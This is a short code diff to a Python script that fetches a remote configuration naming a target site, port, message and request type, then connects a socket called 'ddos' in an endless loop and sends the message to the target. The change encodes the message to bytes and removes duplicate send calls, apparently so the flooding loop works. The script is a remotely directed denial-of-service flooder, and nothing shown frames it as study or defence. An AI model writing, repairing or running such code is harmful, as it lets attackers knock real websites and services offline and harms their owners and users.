@@ -14,7 +14,7 @@ config = json.loads(cfg.text)
 
 ip = config["site"]
 port = config["port"]
-message = config["message"]
+message = config["message"].encode()
 type = config["type"]
 
 if type == "GET":
@@ -29,8 +29,6 @@ elif type == "socket":
         while True:
             ddos.connect((ip, port))
             ddos.send( message )
-            ddos.sendto( message, (ip, port) )
-            ddos.send( message );
             ddos.close()
     except Exception as e:
         print(e)
